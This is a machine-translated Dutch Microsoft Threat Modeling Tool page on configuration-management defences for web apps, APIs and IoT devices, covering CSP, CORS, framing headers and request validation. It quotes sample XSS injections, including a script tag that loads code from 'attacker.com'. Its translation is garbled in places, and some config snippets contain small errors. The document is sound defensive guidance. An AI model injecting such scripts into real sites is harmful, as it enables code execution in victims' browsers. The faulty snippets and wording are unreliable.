---
title: Configuration Management - Microsoft Threat Modeling Tool - Azure | Microsoft Docs
description: oplossingen voor bedreigingen die beschikbaar zijn in de Threat Modeling Tool
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: b24d32afed5acfd846f9a8e8316339665524ad2e
ms.sourcegitcommit: 11d8ce8cd720a1ec6ca130e118489c6459e04114
ms.translationtype: MT
ms.contentlocale: nl-NL
ms.lasthandoff: 12/04/2018
ms.locfileid: "52849758"
---
# <a name="security-frame-configuration-management--mitigations"></a>Beveiliging-Frame: Configuratiebeheer | Oplossingen 
| Product/Service | Artikel |
| --------------- | ------- |
| **Web-App** | <ul><li>[Implementeren van Content Security Policy (CSP) en inline javascript uitschakelen](#csp-js)</li><li>[Inschakelen van de browser XSS-filter](#xss-filter)</li><li>[ASP.NET-toepassingen moeten uitschakelen, tracering en foutopsporing voorafgaand aan de implementatie](#trace-deploy)</li><li>[Toegang van derden javascripts van alleen vertrouwde bronnen](#js-trusted)</li><li>[Zorg ervoor dat geverifieerde ASP.NET-pagina's gebruikersinterface Redressing of steunpunten voor de klik beveiliging opnemen](#ui-defenses)</li><li>[Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld voor ASP.NET-webtoepassingen](#cors-aspnet)</li><li>[ValidateRequest kenmerk voor ASP.NET-pagina's inschakelen](#validate-aspnet)</li><li>[Meest recente versies van JavaScript-bibliotheken lokaal gehoste gebruiken](#local-js)</li><li>[Automatische MIME-controle uitschakelen](#mime-sniff)</li><li>[Standard van SQL server-headers op Windows Azure Web Sites om te voorkomen dat fingerprinting verwijderen](#standard-finger)</li></ul> |
| **Database** | <ul><li>[Een Windows-Firewall for Database Engine Access configureren](#firewall-db)</li></ul> |
| **Web-API** | <ul><li>[Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld voor ASP.NET-Web-API](#cors-api)</li><li>[Secties van Web-API-configuratiebestanden met gevoelige gegevens versleutelen](#config-sensitive)</li></ul> |
| **IoT-apparaat** | <ul><li>[Zorg ervoor dat alle admin-interfaces zijn beveiligd met sterke referenties](#admin-strong)</li><li>[Zorg ervoor dat onbekende code kan niet worden uitgevoerd op apparaten](#unknown-exe)</li><li>[OS- en extra partities van IoT-apparaat met BitLocker versleutelen](#partition-iot)</li><li>[Zorg ervoor dat alleen de minimale services en-functies zijn ingeschakeld op apparaten](#min-enable)</li></ul> |
| **Veld voor IoT-Gateway** | <ul><li>[OS- en extra partities van IoT-Veldgateway met BitLocker versleutelen](#field-bit-locker)</li><li>[Zorg ervoor dat de standaard-aanmeldingsreferenties van de veldgateway zijn gewijzigd tijdens de installatie](#default-change)</li></ul> |
| **IoT-Cloud-Gateway** | <ul><li>[Zorg ervoor dat de Cloudgateway een proces implementeert voor de verbonden apparaten-firmware up-to-date te houden](#cloud-firmware)</li></ul> |
| **Vertrouwensgrenzen van computer** | <ul><li>[Zorg ervoor dat apparaten eindpunt beveiligingsmechanismen geconfigureerd volgens organisatiebeleid hebben](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Zorg ervoor dat veilig beheer van de toegangssleutels voor Azure storage](#secure-keys)</li><li>[Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op de Azure-opslag](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Beperking van de functie van WCF-service inschakelen](#throttling)</li><li>[WCF-informatie worden vrijgegeven via metagegevens](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementeren van Content Security Policy (CSP) en inline javascript uitschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Een inleiding tot inhoud beveiligingsbeleid](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [inhoud Security Policy Reference](http://content-security-policy.com/), [beveiligingsfuncties](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Inleiding tot beleid voor beveiliging van inhoud](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) , [Kan ik de CSP gebruiken?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Stappen** | <p>Inhoud Security Policy (CSP) is een ingrijpende beveiligingsmechanisme, een W3C-standaard, waarmee de toepassingseigenaren web controle op de inhoud die is ingesloten in hun site. CSP wordt toegevoegd als een HTTP-antwoordheader op de webserver en aan de clientzijde wordt afgedwongen door de browsers. Er is een beleid op basis van een lijst met toegestane adressen: een website een set van vertrouwde domeinen uit welke actieve inhoud kunt aangeven, zoals JavaScript kan worden geladen.</p><p>Biedt de volgende beveiligingsvoordelen CSP:</p><ul><li>**Bescherming tegen XSS:** als een pagina kwetsbaar voor XSS is, kunt u deze in een aanvaller kan misbruiken in 2 manieren:<ul><li>Injecteer `<script>malicious code</script>`. Deze aanval werkt niet vanwege een van de CSP Base beperking-1</li><li>Injecteer `<script src=”http://attacker.com/maliciousCode.js”/>`. Deze aanval werkt niet omdat het domein van de aanvaller zich niet in de whitelist van domeinen van de CSP</li></ul></li><li>**Controle over gegevensexfiltratie:** als schadelijke inhoud op een webpagina probeert verbinding maken met een externe website en gegevens stelen, de verbinding wordt afgesloten door de CSP. Dit komt doordat het doeldomein zich niet in van de CSP-whitelist</li><li>**Beveiliging tegen steunpunten voor de klik:** steunpunten voor de klik is een aanval techniek gebruiken dat een kwaadwillende persoon kan frame een legitieme website en force gebruikers op de UI-elementen te klikken. Beveiliging tegen steunpunten voor de klik wordt momenteel bereikt door het configureren van een antwoord-header X-Frame-opties. Niet alle browsers respecteren deze header en gaan forward CSP is een standaard manier om te zetten voor bescherming tegen steunpunten voor de Klik</li><li>**Realtime-aanval reporting:** als er een injectie-aanval op een website CSP ingeschakeld, wordt automatisch een melding naar een eindpunt dat is geconfigureerd op de webserver is geactiveerd voor browsers. Op deze manier CSP fungeert als een realtime waarschuwingssysteem.</li></ul> |

### <a name="example"></a>Voorbeeld
Van voorbeeldbeleid: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Dit beleid kan scripts alleen vanaf de server en het google analytics-server van de webtoepassing worden geladen. Scripts die zijn geladen uit een andere site worden geweigerd. Als CSP is ingeschakeld op een website, worden automatisch de volgende functies uitgeschakeld XSS-aanvallen te verkleinen. 

### <a name="example"></a>Voorbeeld
Inline-scripts worden niet uitgevoerd. Hieronder vindt u voorbeelden van inline-scripts 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Voorbeeld
Tekenreeksen niet beoordeeld als code. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Inschakelen van de browser XSS-filter

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [XSS Protection Filter](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Stappen** | <p>Configuratie van de header X-XSS-bescherming antwoorden bepaalt van de browser cross-site-script-filter. Deze antwoordheader kan beschikken over de volgende waarden:</p><ul><li>`0:` Hiermee wordt het filter uitgeschakeld</li><li>`1: Filter enabled` Als een cross-site scripting-aanval wordt gedetecteerd, als u wilt stoppen van de aanval, wordt de browser opschonen de pagina</li><li>`1: mode=block : Filter enabled`. In plaats daarvan dan de pagina opschonen wanneer een XSS-aanval wordt gedetecteerd, de browser wordt voorkomen dat weergave van de pagina</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. De browser wordt opschonen van de pagina en rapporteren van de schending.</li></ul><p>Dit is een chroom-functie met behulp van CSP schending van rapporten voor het verzenden van gegevens naar een URI van uw keuze. De laatste 2 opties worden beschouwd als veilig waarden.</p>|

## <a id="trace-deploy"></a>ASP.NET-toepassingen moeten uitschakelen, tracering en foutopsporing voorafgaand aan de implementatie

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Overzicht Debugging ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET tracering overzicht](http://msdn2.microsoft.com/library/bb386420.aspx), [hoe: tracering inschakelen voor een ASP.NET-toepassing](http://msdn2.microsoft.com/library/0x5wc973.aspx), [hoe: foutopsporing voor ASP.NET-toepassingen inschakelen](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Stappen** | Als tracering is ingeschakeld voor de pagina, elke browser aanvragen dat wordt ook de traceringsinformatie die gegevens over de interne status en werkstroom bevat hebt verkregen. Deze informatie wordt mogelijk invloed op de beveiliging. Wanneer foutopsporing is ingeschakeld voor de pagina, leiden tot fouten gebeurt op de server een volledige stack-traceringsgegevens weergegeven in de browser. Vertrouwelijke informatie over de werkstroom van de server kan een beveiligingsrisico voor die gegevens. |

## <a id="js-trusted"></a>Toegang van derden javascripts van alleen vertrouwde bronnen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | externe JavaScripts moet alleen van betrouwbare bronnen worden verwezen. De referentie-eindpunten worden altijd op SSL. |

## <a id="ui-defenses"></a>Zorg ervoor dat geverifieerde ASP.NET-pagina's gebruikersinterface Redressing of steunpunten voor de klik beveiliging opnemen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Klik-steunpunten voor Defense Cheat Sheet OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [inhoud van Internet Explorer - bestrijding steunpunten voor de Klik met X-Frame-opties](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Stappen** | <p>Steunpunten voor het klikken, ook wel bekend als een 'gebruikersinterface schadevergoeding aanval', is als een aanvaller met meerdere lagen voor transparant of ondoorzichtig verleiden dat een gebruiker te klikken op een knop of koppeling in een andere pagina wanneer ze wilde maken zijn te klikken op de pagina op het hoogste niveau.</p><p>Deze gelaagdheid wordt bereikt door het samenstellen van een schadelijke pagina met een iframe, die wordt geladen pagina van het slachtoffer. Dus de aanvaller is '-hijacking"klikken bedoeld voor de pagina en routering ze naar een andere pagina waarschijnlijk eigendom van een andere toepassing, domein, of beide. Om te voorkomen steunpunten voor de klik aanvallen, stelt u de juiste X-Frame-opties voor HTTP-antwoordheaders die de browser om geen framing uit andere domeinen instrueren</p>|

### <a name="example"></a>Voorbeeld
De header X-FRAME-opties kan worden ingesteld via IIS web.config. Codefragment web.config voor sites die moeten nooit worden opgesteld: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Voorbeeld
Web.config-code voor sites die alleen moeten worden opgesteld door pagina's in hetzelfde domein: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld voor ASP.NET-webtoepassingen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Webformulieren, MVC5 |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | <p>Browserbeveiliging voorkomt dat een webpagina AJAX-aanvragen indient bij een ander domein. Deze beperking het beleid voor zelfde oorsprong wordt genoemd, en voorkomt u dat een kwaadwillende site gevoelige gegevens leest uit een andere site. Soms het echter mogelijk zijn vereist voor de API's veilig stellen welke andere sites kunnen gebruiken. Cross Origin Resource Sharing (CORS) is een W3C-standaard waarmee een server aan het beleid voor zelfde oorsprong versoepelen. Met behulp van CORS, kan een server expliciet toestaan bepaalde cross-origin-aanvragen terwijl andere worden afgewezen.</p><p>CORS is een veiligere en meer flexibiliteit dan vorige technieken zoals JSONP. In de kern vertaalt CORS inschakelen voor het toevoegen van een paar HTTP-antwoordheaders (Access - Control-*) naar de web-toepassing en dit kunnen worden uitgevoerd in een aantal manieren.</p>|

### <a name="example"></a>Voorbeeld
Toegang tot Web.config beschikbaar is, kunnen CORS worden toegevoegd via de volgende code: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Voorbeeld
Toegang tot web.config niet beschikbaar is, kunnen CORS worden geconfigureerd door de volgende CSharp-code toe te voegen: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Houd er rekening mee dat het is essentieel om ervoor te zorgen dat de lijst met oorsprongen in 'Access-Control-Allow-Origin'-kenmerk is ingesteld op een eindige en vertrouwde set oorsprongen. Failover-overschakeling naar dit ongepast configureren (bijvoorbeeld, als u de waarde als ' *') kan schadelijke sites voor het activeren van cross-origin-aanvragen naar de webtoepassing > zonder beperkingen, waardoor de toepassing kwetsbaar voor aanvallen CSRF. 

## <a id="validate-aspnet"></a>ValidateRequest kenmerk voor ASP.NET-pagina's inschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Webformulieren, MVC5 |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Validatie - Script-aanvallen te voorkomen dat aanvragen](http://www.asp.net/whitepapers/request-validation) |
| **Stappen** | <p>Voor Aanvraagvalidatie, een functie van ASP.NET sinds versie 1.1, voorkomt dat de server accepteert van inhoud met niet-gecodeerde HTML. Deze functie is ontworpen om te voorkomen dat bepaalde script-injectieaanvallen waarbij scriptcode client of HTML-code kan worden onbewust verzonden naar een server, die zijn opgeslagen en vervolgens gepresenteerd aan andere gebruikers. Nog steeds wordt aangeraden dat u alle ingevoerde gegevens valideren en HTML coderen deze indien nodig.</p><p>Aanvraagvalidatie wordt uitgevoerd door alle ingevoerde gegevens om een lijst van mogelijk schadelijke waarden te vergelijken. Als er een overeenkomst optreedt, ASP.NET leidt tot een `HttpRequestValidationException`. Aanvragen validatie-functie is standaard ingeschakeld.</p>|

### <a name="example"></a>Voorbeeld
Deze functie kan echter worden uitgeschakeld op het paginaniveau van: 
```XML
<%@ Page validateRequest="false" %> 
```
of, op het toepassingsniveau van de 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Houd er rekening mee dat aanvragen validatie-functie wordt niet ondersteund en maakt geen deel uit van MVC6 pijplijn. 

## <a id="local-js"></a>Meest recente versies van JavaScript-bibliotheken lokaal gehoste gebruiken

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | <p>Ontwikkelaars die gebruikmaken van standaard JavaScript-bibliotheken zoals JQuery moet goedgekeurde versies van algemene JavaScript-bibliotheken die geen bekende beveiligingsfouten bevatten. Een goede gewoonte is het gebruik van de meest recente versie van de bibliotheken, omdat ze security-oplossingen voor bekende beveiligingsproblemen in oudere versies van hun bevatten.</p><p>Als de meest recente versie kan niet worden gebruikt vanwege compatibiliteitsredenen, de volgende minimaal vereiste versies moeten worden gebruikt.</p><p>Acceptabele minimaal vereiste versies:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery 1.9 valideren</li><li>JQuery Mobile 1.0.1</li><li>JQuery cyclus 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**AJAX-besturingselement Toolkit**<ul><li>AJAX-besturingselement Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms en Ajax**<ul><li>ASP.NET Web Forms en Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nooit alle JavaScript-bibliotheken van externe sites zoals openbare CDN's worden geladen</p>|

## <a id="mime-sniff"></a>Automatische MIME-controle uitschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [IE8 Security onderdeel V: uitgebreide bescherming](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-type](http://en.wikipedia.org/wiki/Mime_type) |
| **Stappen** | De header X-inhoud-Type-opties is een HTTP-header die ontwikkelaars de mogelijkheid om op te geven biedt dat de inhoud ervan niet MIME-sniff worden moet. Deze header is ontworpen voor het beperken van aanvallen MIME bekijken. Voor elke pagina die gebruikers te beheren zijn inhoud kan bevatten, moet u de HTTP-Header X-inhoud-Type-opties: nosniff. Schakel de vereiste koptekst wereldwijd voor alle pagina's in de toepassing door kunt u een van de volgende doen|

### <a name="example"></a>Voorbeeld
Als de toepassing wordt gehost door Internet Information Services (IIS) 7 of hoger, moet u de header toevoegen in het bestand web.config. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Voorbeeld
De header via de wereldwijde toepassing toevoegen\_BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Voorbeeld
Aangepaste HTTP-module implementeren 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Voorbeeld
U kunt de vereiste koptekst alleen voor bepaalde pagina's inschakelen door toe te voegen aan afzonderlijke antwoorden: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Standard van SQL server-headers op Windows Azure Web Sites om te voorkomen dat fingerprinting verwijderen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | EnvironmentType - Azure |
| **Verwijzingen**              | [Standard van SQL server-headers op Windows Azure websites verwijderen](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Stappen** | Kopteksten, zoals Server, X-aangedreven-door X-AspNet-Version geven informatie over de server en de onderliggende technologie. Het verdient aanbeveling waardoor deze headers onderdrukken zo wordt voorkomen dat de toepassing fingerprinting |

## <a id="firewall-db"></a>Een Windows-Firewall for Database Engine Access configureren

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Database | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | SQL Azure, on-premises |
| **Kenmerken**              | N.V.T., versie van SQL - V12 |
| **Verwijzingen**              | [Het configureren van een Azure SQL database-firewall](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [configureren van een Windows-Firewall for Database Engine Access](https://msdn.microsoft.com/library/ms175043) |
| **Stappen** | Firewall-systemen helpen te voorkomen dat onbevoegde toegang tot bronnen van computer. Voor toegang tot een exemplaar van SQL Server Database Engine via een firewall, moet u de firewall configureren op de computer met SQL Server om toegang te verlenen |

## <a id="cors-api"></a>Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld voor ASP.NET-Web-API

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Web-API | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | MVC 5 |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Inschakelen van Cross-Origin-aanvragen in ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - ondersteuning voor CORS in ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Stappen** | <p>Browserbeveiliging voorkomt dat een webpagina AJAX-aanvragen indient bij een ander domein. Deze beperking het beleid voor zelfde oorsprong wordt genoemd, en voorkomt u dat een kwaadwillende site gevoelige gegevens leest uit een andere site. Soms het echter mogelijk zijn vereist voor de API's veilig stellen welke andere sites kunnen gebruiken. Cross Origin Resource Sharing (CORS) is een W3C-standaard waarmee een server aan het beleid voor zelfde oorsprong versoepelen.</p><p>Met behulp van CORS, kan een server expliciet toestaan bepaalde cross-origin-aanvragen terwijl andere worden afgewezen. CORS is een veiligere en meer flexibiliteit dan vorige technieken zoals JSONP.</p>|

### <a name="example"></a>Voorbeeld
In de App_Start/WebApiConfig.cs, voegt u de volgende code toe aan de methode WebApiConfig.Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Voorbeeld
EnableCors kenmerk kan worden toegepast op de actiemethoden in een domeincontroller die als volgt: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Houd er rekening mee dat het is essentieel om ervoor te zorgen dat de lijst met oorsprongen in EnableCors kenmerk is ingesteld op een eindige en vertrouwde set oorsprongen. Failover-overschakeling naar dit ongepast configureren (bijvoorbeeld, als u de waarde als ' *') kan schadelijke sites voor het activeren van cross-origin-aanvragen naar de API zonder beperkingen, > waardoor de API kwetsbaar voor aanvallen CSRF. EnableCors kan worden voorzien van op het niveau van de domeincontroller. 

### <a name="example"></a>Voorbeeld
Als wilt uitschakelen CORS voor een bepaalde methode in een klasse, kan het kenmerk DisableCors worden gebruikt, zoals hieronder weergegeven: 
```csharp
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Web-API | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | MVC 6 |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Cross-Origin Requests (CORS) in ASP.NET Core 1.0 inschakelen](https://docs.asp.net/en/latest/security/cors.html) |
| **Stappen** | <p>In de ASP.NET Core 1.0 kan CORS worden ingeschakeld met behulp van middleware of met behulp van MVC. Bij het gebruik van MVC CORS inschakelen de dezelfde CORS-services worden gebruikt, maar is niet de CORS-middleware.</p>|

**Methode 1** CORS inschakelen met middleware: om in te schakelen CORS voor de gehele toepassing de CORS-middleware toevoegen aan de aanvraag-pijplijn met behulp van de uitbreidingsmethode UseCors. Een cross-origin-beleid kan worden opgegeven bij het toevoegen van de CORS-middleware met behulp van de klasse CorsPolicyBuilder. Er zijn twee manieren om dit te doen:

### <a name="example"></a>Voorbeeld
De eerste is om aan te roepen UseCors met een lambda. De lambda wordt een object CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Voorbeeld
De tweede is het definiëren van een of meer met de naam CORS-beleid en selecteer vervolgens het beleid met de naam tijdens de uitvoering. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Methode 2** CORS inschakelen in MVC: ontwikkelaars kunnen ook MVC gebruiken om toe te passen van specifieke CORS per actie, per controller, maar ook voor alle domeincontrollers.

### <a name="example"></a>Voorbeeld
Per actie: om op te geven van een CORS-beleid voor een specifieke actie het kenmerk [EnableCors] toevoegen aan de actie. Geef de naam van het beleid. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Voorbeeld
Per controller: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Voorbeeld
Globaal: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Houd er rekening mee dat het is essentieel om ervoor te zorgen dat de lijst met oorsprongen in EnableCors kenmerk is ingesteld op een eindige en vertrouwde set oorsprongen. Failover-overschakeling naar dit ongepast configureren (bijvoorbeeld, als u de waarde als ' *') kan schadelijke sites voor het activeren van cross-origin-aanvragen naar de API zonder beperkingen, > waardoor de API kwetsbaar voor aanvallen CSRF. 

### <a name="example"></a>Voorbeeld
Als u wilt uitschakelen CORS voor een domeincontroller of een actie, door het kenmerk [DisableCors] te gebruiken. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Secties van Web-API-configuratiebestanden met gevoelige gegevens versleutelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Web-API | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Procedure: Coderen Netwerkconfiguratiesecties in ASP.NET 2.0 met behulp van DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [op te geven een Configuratieprovider beveiligd](https://msdn.microsoft.com/library/68ze1hb2.aspx), [met behulp van Azure Key Vault om toepassingsgeheimen te beveiligen](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Stappen** | Configuratie van bestanden, als het bestand Web.config, appsettings.json vaak worden gebruikt voor het opslaan van gevoelige gegevens, zoals gebruikersnamen, wachtwoorden, databaseverbindingsreeksen en versleutelingssleutels. Als u deze informatie niet beveiligt, is uw toepassing kwetsbaar zijn voor aanvallers of kwaadwillende gebruikers die gevoelige gegevens, zoals gebruikersnamen en wachtwoorden, databasenamen en servernamen. De gevoelige secties van de config-bestanden met behulp van DPAPI- of -services zoals Azure Key Vault op basis van het implementatietype (azure/on-premises), worden versleuteld. |

## <a id="admin-strong"></a>Zorg ervoor dat alle admin-interfaces zijn beveiligd met sterke referenties

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | Administratieve interfaces waarmee wordt aangegeven dat de gateway-apparaat of het veld moeten worden beveiligd met sterke referenties. Ook andere blootgestelde interfaces, zoals Wi-Fi, SSH, bestandsshares, FTP moet zijn beveiligd met sterke referenties. Standaard zwakke wachtwoorden mogen niet worden gebruikt. |

